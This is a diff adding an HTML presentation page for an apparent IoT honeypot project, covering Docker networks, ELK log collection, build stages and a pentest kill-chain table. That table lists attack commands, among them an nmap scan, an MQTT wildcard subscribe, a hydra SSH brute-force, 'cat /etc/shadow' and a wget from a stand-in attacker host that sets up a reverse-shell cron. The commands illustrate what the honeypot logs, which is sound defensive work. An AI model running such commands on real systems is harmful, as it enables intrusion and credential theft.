+        <text x="74" y="125" fill="#f43f5e" font-family="monospace" font-size="8" text-anchor="middle">THREAT ACTORS</text>
+        <rect x="14" y="137" width="120" height="20" rx="2" fill="#0a0a0a" stroke="#fb923c"/>
+        <text x="74" y="151" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">MIRAI BOTNETS</text>
+        <rect x="14" y="163" width="120" height="20" rx="2" fill="#0a0a0a" stroke="#f43f5e"/>
+        <text x="74" y="177" fill="#f43f5e" font-family="monospace" font-size="8" text-anchor="middle">PORT SCANNERS</text>
+        <rect x="14" y="189" width="120" height="16" rx="2" fill="#0a0a0a" stroke="#333"/>
+        <text x="74" y="201" fill="#555" font-family="monospace" font-size="7" text-anchor="middle">hydra / nmap / metasploit</text>
+        <line x1="142" y1="137" x2="178" y2="137" stroke="#666" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#a1)"/>
+
+        <!-- ── ROUTER ── -->
+        <rect x="180" y="120" width="72" height="34" rx="3" fill="#0a0a0a" stroke="#60a5fa" stroke-width="1.5"/>
+        <text x="216" y="141" fill="#93c5fd" font-family="monospace" font-size="9" text-anchor="middle">ROUTER</text>
+        <line x1="252" y1="137" x2="288" y2="137" stroke="#666" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#a1)"/>
+
+        <!-- ── FIREWALL + AI ── -->
+        <rect x="290" y="109" width="98" height="56" rx="3" fill="#071a0f" stroke="#4ade80" stroke-width="2"/>
+        <text x="339" y="131" fill="#4ade80" font-family="monospace" font-size="9" text-anchor="middle">FIREWALL</text>
+        <text x="339" y="144" fill="#4ade80" font-family="monospace" font-size="9" text-anchor="middle">+ AI MODEL</text>
+        <text x="339" y="157" fill="#1a4d2a" font-family="monospace" font-size="8" text-anchor="middle">stage 4 →</text>
+        <line x1="388" y1="137" x2="428" y2="137" stroke="#4ade80" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#a3)"/>
+
+        <!-- ── CLOUD BOUNDARY — bright white ── -->
+        <rect x="432" y="8" width="762" height="690" rx="6" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-dasharray="14,6" opacity=".3"/>
+        <text x="813" y="24" fill="#666" font-family="monospace" font-size="9" text-anchor="middle" letter-spacing="4">CLOUD  IaaS</text>
+
+        <!-- ── HONEYPOT NET — bright cyan border ── -->
+        <rect x="444" y="36" width="742" height="298" rx="4" fill="none" stroke="#00e5c3" stroke-width="1.5" stroke-dasharray="6,4" opacity=".5"/>
+        <text x="815" y="52" fill="#00e5c3" font-family="monospace" font-size="8" text-anchor="middle" opacity=".7">honeypot_net — 172.20.0.0/24 — bridge</text>
+
+        <!-- ── MAIN SERVER ── -->
+        <rect x="454" y="60" width="170" height="264" rx="3" fill="#0a0a0a" stroke="#00e5c3" stroke-width="2"/>
+        <text x="539" y="79" fill="#00e5c3" font-family="monospace" font-size="10" text-anchor="middle" font-weight="bold">MAIN-SERVER</text>
+        <text x="539" y="92" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">172.20.0.2</text>
+        <line x1="464" y1="98" x2="614" y2="98" stroke="#222"/>
+
+        <!-- supervisord spine -->
+        <text x="467" y="112" fill="#4ade80" font-family="monospace" font-size="8">supervisord</text>
+        <line x1="470" y1="116" x2="470" y2="210" stroke="#4ade80" stroke-width="1" opacity=".5"/>
+
+        <line x1="470" y1="124" x2="481" y2="124" stroke="#4ade80" stroke-width="0.8" opacity=".5"/>
+        <text x="484" y="128" fill="#999" font-family="monospace" font-size="8">Cowrie SSH:22 </text>
+        <line x1="470" y1="140" x2="481" y2="140" stroke="#4ade80" stroke-width="0.8" opacity=".5"/>
+        <text x="484" y="144" fill="#999" font-family="monospace" font-size="8">Cowrie Telnet :23</text>
+        <line x1="470" y1="156" x2="481" y2="156" stroke="#4ade80" stroke-width="0.8" opacity=".5"/>
+        <text x="484" y="160" fill="#999" font-family="monospace" font-size="8">MQTT Server :1883</text>
+        <line x1="470" y1="172" x2="481" y2="172" stroke="#4ade80" stroke-width="0.8" opacity=".5"/>
+        <text x="484" y="176" fill="#999" font-family="monospace" font-size="8">CoAP Server :5683</text>
+        <line x1="470" y1="188" x2="481" y2="188" stroke="#4ade80" stroke-width="0.8" opacity=".5"/>
+        <text x="484" y="192" fill="#999" font-family="monospace" font-size="8">HTTP Server :8080</text>
+        <line x1="470" y1="204" x2="481" y2="204" stroke="#4ade80" stroke-width="0.8" opacity=".5"/>
+        <text x="484" y="208" fill="#999" font-family="monospace" font-size="8">IoT Platform :80</text>
+
+        <!-- ubuntu + logrotate OUTSIDE supervisord, below the box -->
+        <text x="539" y="284" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">ubuntu:22.04</text>
+        <text x="539" y="298" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">logrotate (hourly)</text>
+        <line x1="454" y1="256" x2="624" y2="256" stroke="#222"/>
+
+        <!-- arrow main-server → iot_devices + EDGE COMPUTING label -->
+        <line x1="624" y1="190" x2="666" y2="190" stroke="#fb923c" stroke-width="1.5" marker-end="url(#a1)"/>
+        <text x="645" y="183" fill="#fb923c" font-family="monospace" font-size="7.5" text-anchor="middle">edge</text>
+        <text x="645" y="200" fill="#fb923c" font-family="monospace" font-size="7.5" text-anchor="middle">computing</text>
+
+        <!-- ── IOT DEVICES BOX — far right ── -->
+        <rect x="668" y="60" width="508" height="264" rx="3" fill="#0a0a0a" stroke="#fb923c" stroke-width="2"/>
+        <text x="922" y="79" fill="#fb923c" font-family="monospace" font-size="10" text-anchor="middle" font-weight="bold">IOT_DEVICES</text>
+        <line x1="678" y1="86" x2="1166" y2="86" stroke="#2a1800"/>
+
+        <rect x="678" y="94" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="736" y="108" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">🔒 .11 lock MQTT</text>
+        <rect x="802" y="94" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="860" y="108" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">🌡️ .13 therm MQTT</text>
+        <rect x="926" y="94" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="984" y="108" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">🚨 .12 alarm MQTT</text>
+        <rect x="1050" y="94" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="1108" y="108" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">🔌 .14 plug MQTT</text>
+
+        <rect x="678" y="122" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="736" y="136" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">📹 .10 cam HTTP</text>
+        <rect x="802" y="122" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="860" y="136" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">🔔 .16 bell HTTP</text>
+        <rect x="926" y="122" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="984" y="136" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">💡 .17 bulb CoAP</text>
+        <rect x="1050" y="122" width="116" height="20" rx="2" fill="#0a0a0a" stroke="#3d1f00"/>
+        <text x="1108" y="136" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">🏃 .15 motion CoAP</text>
+
+        <!-- ── ELK NET — bright green border ── -->
+        <rect x="444" y="354" width="742" height="320" rx="4" fill="none" stroke="#4ade80" stroke-width="1.5" stroke-dasharray="6,4" opacity=".45"/>
+        <text x="815" y="370" fill="#4ade80" font-family="monospace" font-size="8" text-anchor="middle" opacity=".6">elk_net — 172.22.0.0/24 — internal:true (no internet route)</text>
+
+        <!-- ── FILEBEAT — left ── -->
+        <rect x="454" y="384" width="128" height="116" rx="3" fill="#071a0f" stroke="#00e5c3" stroke-width="2"/>
+        <text x="518" y="404" fill="#00e5c3" font-family="monospace" font-size="10" text-anchor="middle" font-weight="bold">FILEBEAT</text>
+        <text x="518" y="417" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">172.22.0.3 + .20</text>
+        <line x1="464" y1="423" x2="572" y2="423" stroke="#222"/>
+        <text x="518" y="436" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">reads /var/log:ro</text>
+        <text x="518" y="449" fill="#00e5c3" font-family="monospace" font-size="8" text-anchor="middle">version 8.6.0</text>
+        <text x="518" y="462" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">bridges both nets</text>
+        <text x="518" y="490" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">ships → Logstash</text>
+
+        <!-- log flow: main-server → filebeat -->
+        <path d="M539 324 Q539 362 518 384" fill="none" stroke="#00e5c3" stroke-width="1.2" stroke-dasharray="4,3" marker-end="url(#a2)"/>
+        <text x="554" y="356" fill="#00e5c3" font-family="monospace" font-size="8">/var/log/*</text>
+
+        <!-- filebeat → logstash arrow -->
+        <line x1="582" y1="440" x2="626" y2="440" stroke="#00e5c3" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#a2)"/>
+        <text x="602" y="434" fill="#00e5c3" font-family="monospace" font-size="8" text-anchor="middle">:5045</text>
+
+        <!-- ── ELK OUTER BOX ── -->
+        <rect x="630" y="380" width="548" height="270" rx="3" fill="#0a0a0a" stroke="#4ade80" stroke-width="1.5"/>
+        <text x="904" y="398" fill="#4ade80" font-family="monospace" font-size="9" text-anchor="middle" font-weight="bold">ELK STACK — sebp/elk:8.6.0 — 172.22.0.2</text>
+        <line x1="640" y1="404" x2="1168" y2="404" stroke="#1a4d2a"/>
+
+        <!-- Logstash sub -->
+        <rect x="642" y="414" width="128" height="92" rx="2" fill="#071a0f" stroke="#4ade80" stroke-width="1"/>
+        <text x="706" y="431" fill="#4ade80" font-family="monospace" font-size="9" text-anchor="middle" font-weight="bold">Logstash</text>
+        <text x="706" y="444" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">:5045 beats in</text>
+        <text x="706" y="457" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">enrich + route</text>
+        <text x="706" y="470" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">by log_source tag</text>
+        <text x="706" y="483" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">heap 1GB</text>
+        <line x1="770" y1="460" x2="810" y2="460" stroke="#4ade80" stroke-width="1.5" marker-end="url(#a3)"/>
+
+        <!-- Elasticsearch sub -->
+        <rect x="812" y="414" width="140" height="92" rx="2" fill="#071a0f" stroke="#4ade80" stroke-width="1"/>
+        <text x="882" y="431" fill="#4ade80" font-family="monospace" font-size="9" text-anchor="middle" font-weight="bold">Elasticsearch</text>
+        <text x="882" y="444" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">:9200</text>
+        <text x="882" y="457" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">honeypot-* indices</text>
+        <text x="882" y="470" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">6 index patterns</text>
+        <text x="882" y="483" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">heap 2GB</text>
+        <line x1="952" y1="460" x2="990" y2="460" stroke="#4ade80" stroke-width="1.5" marker-end="url(#a3)"/>
+
+        <!-- Kibana sub -->
+        <rect x="992" y="414" width="108" height="92" rx="2" fill="#071a0f" stroke="#4ade80" stroke-width="1"/>
+        <text x="1046" y="431" fill="#4ade80" font-family="monospace" font-size="9" text-anchor="middle" font-weight="bold">Kibana</text>
+        <text x="1046" y="444" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">:5601</text>
+        <text x="1046" y="457" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">dashboards</text>
+        <text x="1046" y="470" fill="#999" font-family="monospace" font-size="8" text-anchor="middle">index patterns</text>
+        <text x="1046" y="483" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">visualize</text>
+
+        <!-- elk-init — center of ELK net ── -->
+        <rect x="700" y="522" width="148" height="52" rx="2" fill="#0a0a0a" stroke="#444" stroke-width="1.2"/>
+        <text x="774" y="540" fill="#666" font-family="monospace" font-size="9" text-anchor="middle">elk-init</text>
+        <text x="774" y="553" fill="#555" font-family="monospace" font-size="8" text-anchor="middle">applies index templates</text>
+        <text x="774" y="564" fill="#444" font-family="monospace" font-size="8" text-anchor="middle">restart:no — exits ✓</text>
+
+        <!-- ── LEGEND — bottom center, outside cloud ── -->
+        <rect x="20" y="580" width="8" height="8" fill="#f43f5e"/>
+        <text x="35" y="588" fill="#fff" font-family="monospace" font-size="10">Attacker</text>
+        <rect x="20" y="600" width="8" height="8" fill="#00e5c3"/>
+        <text x="35" y="608" fill="#fff" font-family="monospace" font-size="10">Log flow</text>
+        <rect x="20" y="620" width="8" height="8" fill="#fb923c"/>
+        <text x="35" y="628" fill="#fff" font-family="monospace" font-size="10">IoT devices</text>
+        <rect x="20" y="640" width="8" height="8" fill="#4ade80"/>
+        <text x="35" y="648" fill="#fff" font-family="monospace" font-size="10">ELK stack</text>
+        <rect x="20" y="660" width="8" height="8" fill="none" stroke="#ffffff" opacity=".3"/>
+        <text x="35" y="668" fill="#fff" font-family="monospace" font-size="10">Cloud IaaS</text>
+        <rect x="20" y="680" width="8" height="8" fill="none" stroke="#00e5c3" opacity=".5"/>
+        <text x="35" y="688" fill="#fff" font-family="monospace" font-size="10">honeypot_net</text>
+        <rect x="20" y="700" width="8" height="8" fill="none" stroke="#4ade80" opacity=".5"/>
+        <text x="35" y="708" fill="#fff" font-family="monospace" font-size="10">elk_net</text>
+      </svg>
+    </div>
+
+    <div class="hl">
+      <div class="hlt">// Edge Computing Topology</div>
+      <div class="hld">Main-server is the IoT <strong>edge gateway</strong><br>elk_net is <strong>internal:true</strong> — no internet route. Attacker can't see it.<br>Firewall is where the AI model deploys in Stage 4.</div>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">NETWORK TOPOLOGY // PHASE 02</div><div class="pfr">Edge Computing on Cloud IaaS</div></div>
+</div>
+
+
+<!-- ══════ DOCKER NETWORKS ══════ -->
+<div id="pg-docker" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Development — Phase 3</div>
+    <div class="ph-title">Docker <span>Networks</span></div>
+    <div class="ph-sub">honeypot_net (bridge) + elk_net (internal) — 11 containers</div>
+  </div>
+  <div class="sec">
+    <p class="sp">Two completely isolated networks:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>-One exposed to attackers</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>-One hidden for log collection</strong></p>
+    <div class="dnets" style="margin-bottom:32px">
+      <div class="dnet dn-c">
+        <div class="dn-t">honeypot_net — 172.20.0.0/24 — bridge</div>
+        <div class="ci"><div class="cip">.2</div><div><span class="cn">main-server</span><div class="cp"><span class="pt">22 SSH</span><span class="pt">23 Telnet</span><span class="pt">1883 MQTT</span><span class="pt">5683/udp CoAP</span><span class="pt">8080 HTTP</span></nr><span class="pt">80 IoT Platform (flask server)</span></div><span class="pt">supervisord (multi-process manager)</span></div></div>
+        <div class="ci"><div class="cip">.10</div><div><span class="cn">sim-camera</span><div class="cp"><span class="pt">HTTP client</span><span class="pt">RTSP :8554</span><span class="pt">MediaMTX</span></div></div></div>
+        <div class="ci"><div class="cip">.16</div><div><span class="cn">sim-doorbell</span><div class="cp"><span class="pt">HTTP client</span><span class="pt">POST /api/doorbell</span></div></div></div>
+        <div class="ci"><div class="cip">.11</div><div><span class="cn">sim-lock</span><div class="cp"><span class="pt">MQTT clients</span><span class="pt">publish + subsribe(on_message)</span></div></div></div>
+        <div class="ci"><div class="cip">.12</div><div><span class="cn">sim-alarm</span><div class="cp"><span class="pt">MQTT clients</span><span class="pt">publish + subsribe(on_message)</span></div></div></div>
+        <div class="ci"><div class="cip">.13</div><div><span class="cn">sim-thermostat</span><div class="cp"><span class="pt">MQTT clients</span><span class="pt">publish + subsribe(on_message)</span></div></div></div>
+        <div class="ci"><div class="cip">.14</div><div><span class="cn">sim-smartplug</span><div class="cp"><span class="pt">MQTT clients</span><span class="pt">publish + subsribe(on_message)</span></div></div></div>
+        <div class="ci"><div class="cip">.15</div><div><span class="cn">sim-motion</span><div class="cp"><span class="pt">CoAP clients</span><span class="pt">PUT /home/*</span></div></div></div>
+        <div class="ci"><div class="cip">.17</div><div><span class="cn">sim-lightbulb</span><div class="cp"><span class="pt">CoAP clients</span><span class="pt">PUT /home/*</span></div></div></div>     
+      </div>
+      <div class="dnet dn-g">
+        <div class="dn-t">elk_net — 172.22.0.0/24 — internal</div>
+        <div class="ci"><div class="cip">.2</div><div><span class="cn">elk (sebp/elk:8.6.0)</span><div class="cp"><span class="pt">ELK Stack</span></div><span class="pt">5045 Logstash</span><br><span class="pt">9200 ElasticSearch</span><br><span class="pt">5601 Kibana</span></div></div>
+        <div class="ci"><div class="cip">.3</div><div><span class="cn">filebeat (8.6.0)</span><div class="cp"><span class="pt">reads /var/log:ro</span><span class="pt">→ :5045</span></div></div></div>
+        <div class="ci"><div class="cip">.5</div><div><span class="cn">elk-init</span><div class="cp"><span class="pt">index templates</span><span class="pt">restart:no</span></div></div></div>
+      </div>
+    </div>
+
+  <!-- LOG FLOW -->
+  <div style="margin-bottom:24px">
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:14px">Log Flow — main-server → elasticsearch</div>
+    <div class="flow" style="margin-bottom:20px">
+      <div class="fs"><span class="fsi">📁</span><span class="fsn">/var/log/*</span><span class="fsd">JSON logs</span></div>
+      <div class="fs"><span class="fsi">📦</span><span class="fsn">Filebeat</span><span class="fsd">ships logs</span></div>
+      <div class="fs"><span class="fsi">⚙️</span><span class="fsn">Logstash</span><span class="fsd">enrich + route</span></div>
+      <div class="fs"><span class="fsi">🔍</span><span class="fsn">Elasticsearch</span><span class="fsd">honeypot-*</span></div>
+      <div class="fs"><span class="fsi">📊</span><span class="fsn">Kibana</span><span class="fsd">:5601</span></div>
+    </div>
+  </div>
+
+  <!-- LOG TYPES -->
+  <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:14px">Log Types — 6 Indices</div>
+  <div class="grid g3">
+    <div class="card">
+      <div class="ct" style="color:#60a5fa">📡 Network Logs</div>
+      <div class="cd">tshark captures all packets on eth0. Source: <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--accent)">honeypot-packets-*</span><br>Fields: src_ip, dst_ip, protocol, tcp_flags, frame_len</div>
+    </div>
+    <div class="card">
+      <div class="ct" style="color:#fb923c">📡 MQTT Server Log</div>
+      <div class="cd">mqtt_logger.py subscribes to #. Source: <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--accent)">honeypot-mqtt-*</span><br>Fields: topic, payload, event_type, is_command</div>
+    </div>
+    <div class="card">
+      <div class="ct" style="color:#4ade80">🌐 HTTP Server Log</div>
+      <div class="cd">http_server.py logs all requests. Source: <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--accent)">honeypot-http-*</span><br>Fields: method, endpoint, status_code, user_agent</div>
+    </div>
+    <div class="card">
+      <div class="ct" style="color:#a78bfa">📶 CoAP Server Log</div>
+      <div class="cd">coap_server.py logs all PUT/GET. Source: <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--accent)">honeypot-coap-*</span><br>Fields: method, path, src_ip, response_code</div>
+    </div>
+    <div class="card">
+      <div class="ct" style="color:#f472b6">🏠 Platform Log</div>
+      <div class="cd">IoT platform Flask app logs. Source: <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--accent)">honeypot-platform-*</span><br>Fields: endpoint, device, command, status</div>
+    </div>
+    <div class="card">
+      <div class="ct" style="color:var(--red)">🦅 SSH/Telnet Log</div>
+      <div class="cd">Cowrie honeypot logs all sessions. Source: <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--accent)">honeypot-cowrie-*</span><br>Fields: eventid, src_ip, username, password, command</div>
+    </div>
+  </div>
+
+</div>
+<div class="pf"><div class="pfl">DOCKER NETWORKS // PHASE 03</div><div class="pfr">11 containers — 2 isolated networks — 6 log types</div></div>
+</div>
+
+<!-- ══════ CONCEPTION ══════ -->
+<div id="pg-conception" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Development — Phase 4</div>
+    <div class="ph-title"><span>Conception</span></div>
+    <div class="ph-sub">4 build stages</div>
+  </div>
+  <div class="sec">
+
+    <!-- S1 -->
+    <div class="sbadge2 sc">Stage 1 — Main Server + IoT Devices</div>
+    <div class="grid g3" style="margin-bottom:16px">
+      <div class="card"><div class="ct">🦅 Cowrie SSH/Telnet</div><div class="cd">SSH :22 / Telnet :23. Fake ARM Linux shell.<br>Credentials: smarthome:smarthome123.<br>Logs all commands and file downloads.</div></div>
+      <div class="card"><div class="ct">📡 Mosquitto MQTT</div><div class="cd">No-auth broker :1883.<br>mqtt_logger.py subscribes to # and $SYS/#<br>logs every message with metadata to JSON.</div></div>
+      <div class="card"><div class="ct">🌐 CoAP + HTTP Servers</div><div class="cd">Python servers.<br>CoAP handles PUT from motion|bulb.<br>HTTP handles POST from camera|doorbell.</div></div>
+    </div>
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:10px;text-transform:uppercase">IoT Devices — each has 2 threads: publish state + wait for command</div>
+    <div class="grid g4" style="margin-bottom:40px">
+      <div class="card"><div class="ct">🔒 Lock (MQTT)</div><div class="cd" style="font-size:12px">publish state+battery<br>on_message: unlock/lock</div></div>
+      <div class="card"><div class="ct">🌡️ Thermostat (MQTT)</div><div class="cd" style="font-size:12px">publish temp+mode<br>on_message: setpoint</div></div>
+      <div class="card"><div class="ct">🚨 Alarm (MQTT)</div><div class="cd" style="font-size:12px">publish state+siren<br>on_message: arm/disarm</div></div>
+      <div class="card"><div class="ct">🔌 Plug (MQTT)</div><div class="cd" style="font-size:12px">publish power+state<br>on_message: on/off</div></div>
+      <div class="card"><div class="ct">📹 Camera (HTTP)</div><div class="cd" style="font-size:12px">POST events every 20s<br>+ RTSP stream (MediaMTX)</div></div>
+      <div class="card"><div class="ct">🔔 Doorbell (HTTP)</div><div class="cd" style="font-size:12px">POST events every 30s<br>random offline periods</div></div>
+      <div class="card"><div class="ct">💡 Bulb (CoAP)</div><div class="cd" style="font-size:12px">PUT /home/light<br>CoAP req/resp only</div></div>
+      <div class="card"><div class="ct">🏃 Motion (CoAP)</div><div class="cd" style="font-size:12px">PUT /home/motion<br>CoAP req/resp only</div></div>
+    </div>
+
+    <!-- S2 -->
+    <div class="sbadge2 sg">Stage 2 — IoT Platform (Flask)</div>
+    <div class="term" style="margin-bottom:40px">
+      <div>
+        <span class="m"># Server-Side Rendering</span><br>
+        <span class="c">POST /login</span>       <span class="m">→ Hardcoded single account Auth -> session -> redirect /dashboard</span><br>
+        <span class="c">GET  /login</span>       <span class="m">→ render login.html</span><br>
+        <span class="c">GET  /dashboard</span>   <span class="m">→ render dashboard.html</span><br><br>
+        <span class="m"># Client-Side Rendering</span><br>
+        <span class="c">WebSocket /api/devices</span> <span class="m">→ returns devices_state{}</span><br>
+        <span class="m">updated by 3 background threads (http_poll + mqtt_poll + coap_poll)</span><br>
+        <span class="c">RestAPI /api/command</span> <span class="m">→ receives POST {device, command}</span><br>
+        <span class="m">→ detects protocol → MQTT pub / HTTP POST / CoAP PUT</span>
+      </div>
+    </div>
+
+    <!-- S3 -->
+    <div class="sbadge2 sb2">Stage 3 — ELK Configuration</div>
+    <div class="flow" style="margin-bottom:16px">
+      <div class="fs"><span class="fsi">📁</span><span class="fsn">filebeat.yml</span><span class="fsd">inputs + output</span></div>
+      <div class="fs"><span class="fsi">⚙️</span><span class="fsn">logstash.conf</span><span class="fsd">enrich + route</span></div>
+      <div class="fs"><span class="fsi">🔍</span><span class="fsn">Elasticsearch</span><span class="fsd">default from image</span></div>
+      <div class="fs"><span class="fsi">📊</span><span class="fsn">Kibana</span><span class="fsd">default from image</span></div>
+    </div>
+    <div style="border:1px solid var(--border);margin-bottom:40px">
+      <table class="tbl">
+        <thead><tr><th>Index</th><th>Source</th><th>Key Fields</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td>honeypot-packets-*</td><td>tshark</td><td>src_ip, dst_ip, protocol, tcp_flags</td><td style="color:var(--accent)">● ACTIVE</td></tr>
+          <tr><td>honeypot-cowrie-*</td><td>Cowrie</td><td>eventid, src_ip, username, password</td><td style="color:var(--accent)">● ACTIVE</td></tr>
+          <tr><td>honeypot-mqtt-*</td><td>mqtt_logger.py</td><td>mqtt_topic, event_type, is_command</td><td style="color:var(--accent)">● ACTIVE</td></tr>
+          <tr><td>honeypot-http-*</td><td>http_server.py</td><td>http_method, endpoint, status_code</td><td style="color:var(--accent)">● ACTIVE</td></tr>
+          <tr><td>honeypot-coap-*</td><td>coap_server.py</td><td>coap_method, coap_path, src_ip</td><td style="color:var(--accent)">● ACTIVE</td></tr>
+          <tr><td>honeypot-platform-*</td><td>app.py</td><td>endpoint, device, command</td><td style="color:var(--accent)">● ACTIVE</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- S4 -->
+    <div class="sbadge2 so">Stage 4 — Docker Compose</div>
+    <div class="term">
+      <div>
+        <span class="c">networks:</span><br>
+        <span class="m">  honeypot_net:  bridge   172.20.0.0/24</span><br>
+        <span class="m">  elk_net:       bridge   172.22.0.0/24   internal: true</span><br><br>
+        <span class="c">volumes:</span><br>
+        <span class="m">  honeypot_logs  · elk_data</span><br><br>
+        <span class="c">services (11):</span><br>
+        <span class="m">  elk · elk-init · main-server · filebeat</span><br>
+        <span class="m">  sim-camera · sim-lock · sim-alarm · sim-thermostat</span><br>
+        <span class="m">  sim-smartplug · sim-motion · sim-lightbulb · sim-doorbell</span><br><br>
+        <span class="w">$ sudo docker compose up --build -d</span><br>
+        <span class="g">✓ 11 containers started — stack fully operational</span>
+      </div>
+    </div>
+
+  </div>
+  <div class="pf"><div class="pfl">CONCEPTION // PHASE 04</div><div class="pfr">4 Build Stages Complete</div></div>
+</div>
+
+<!-- ══════ TESTING ══════ -->
+<div id="pg-testing" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Development — Phase 5</div>
+    <div class="ph-title">Testing <span>&amp; Results</span></div>
+    <div class="ph-sub">infrastructure · devices · pipeline · pentest · cloud readiness</div>
+  </div>
+  <div class="sec">
+
+    <!-- BAR CHART -->
+    <div class="bars" style="margin-bottom:36px">
+      <div class="bars-t">Elasticsearch — Documents per Index (March 17, 2026)</div>
+      <div class="br"><div class="brl">honeypot-packets</div><div class="brt"><div class="brf" style="width:100%;background:linear-gradient(90deg,#00e5c3,#0077aa)">1,204,786</div></div></div>
+      <div class="br"><div class="brl">honeypot-mqtt</div><div class="brt"><div class="brf" style="width:34%;background:linear-gradient(90deg,#4ade80,#166534)">414,737</div></div></div>
+      <div class="br"><div class="brl">honeypot-coap</div><div class="brt"><div class="brf" style="width:6%;background:linear-gradient(90deg,#3b82f6,#1e3a8a)">73,082</div></div></div>
+      <div class="br"><div class="brl">honeypot-http</div><div class="brt"><div class="brf" style="width:3%;background:linear-gradient(90deg,#f97316,#9a3412)">39,636</div></div></div>
+      <div class="br"><div class="brl">honeypot-cowrie</div><div class="brt"><div class="brf" style="width:0.5%;background:linear-gradient(90deg,#f43f5e,#9f1239)">2,753</div></div></div>
+      <div class="br"><div class="brl">honeypot-platform</div><div class="brt"><div class="brf" style="width:0.04%;background:linear-gradient(90deg,#a855f7,#6b21a8)">437</div></div></div>
+    </div>
+
+    <!-- KILL CHAIN -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Pentest — Cyber Kill Chain</div>
+    <div class="kc" style="margin-bottom:36px">
+      <div class="kch"><div>#</div><div>Phase</div><div>Attack</div><div>Logs</div></div>
+      <div class="kcr"><div class="kcn">1</div><div class="kcp">Reconnaissance</div><div class="kca">nmap -sV $ip -p 22,23,80,1883,5683,8080<small>Finds SSH 7.4, open MQTT, HTTP dashboard, CoAP</small></div><div class="kcl">honeypot-packets<br>cowrie (SSH probe)</div></div>
+      <div class="kcr"><div class="kcn">2</div><div class="kcp" style="color:#4ade80">Vuln Scanning</div><div class="kca">mosquitto_sub -h $ip -t '#' -v<small>All device states visible — no auth on MQTT</small></div><div class="kcl">honeypot-mqtt<br>is_known_client:false</div></div>
+      <div class="kcr"><div class="kcn">3</div><div class="kcp" style="color:var(--orange)">Exploitation</div><div class="kca">hydra -l smarthome -P rockyou.txt ssh://$ip → smarthome123<small>SSH brute-force → fake ARM Linux shell</small></div><div class="kcl">cowrie.login.failed ×N<br>cowrie.login.success ←</div></div>
+      <div class="kcr"><div class="kcn">4</div><div class="kcp" style="color:var(--red)">Priv Escalation</div><div class="kca">sudo su / sudo -i / cat /etc/shadow<small>Inside fake shell — thinks they are root on ARM gateway</small></div><div class="kcl">cowrie.command.input<br>all commands logged</div></div>
+      <div class="kcr"><div class="kcn">5</div><div class="kcp" style="color:var(--accent2)">Lateral Movement</div><div class="kca">nmap 172.20.0.0/24 / mosquitto_pub all topics<small>Pivot to devices — MQTT takeover from inside</small></div><div class="kcl">honeypot-packets<br>honeypot-mqtt</div></div>
+      <div class="kcr"><div class="kcn">6</div><div class="kcp" style="color:var(--purple)">Persistence</div><div class="kca">wget http://attacker.com/malware.sh && crontab -e<small>Downloads malware — reverse shell cron</small></div><div class="kcl" style="color:var(--red)">cowrie.file_download<br>← HIGHEST VALUE</div></div>
